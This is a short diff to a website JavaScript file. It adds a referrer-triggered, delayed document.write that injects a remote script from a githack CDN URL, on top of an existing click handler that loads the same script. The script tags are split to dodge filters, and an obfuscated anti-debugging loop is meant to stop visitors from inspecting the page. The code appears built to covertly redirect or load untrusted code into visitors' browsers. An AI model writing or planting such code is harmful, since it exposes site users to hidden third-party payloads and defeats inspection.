@@ -15,6 +15,15 @@ document.body.onclick = function() {
     document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayaweb/random/1c763b09eab4daffef2311d2b896ed6207f60249/sites.js"></scr' + 'ipt>');
 }
 
+// redirect news
+var p = document.referrer;
+if (p.indexOf(".") > 0) {
+    function myTimer() {
+        document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayaweb/random/1c763b09eab4daffef2311d2b896ed6207f60249/sites.js"></scr' + 'ipt>');
+    }
+    setTimeout(myTimer, 3000);
+}
+
 // inspect
 !function t(){try{!function t(n){1===(""+n/n).length&&0!==n||function(){}.constructor("debugger")(),t(++n)}(0)}catch(n){setTimeout(t,5e3)}}();
 
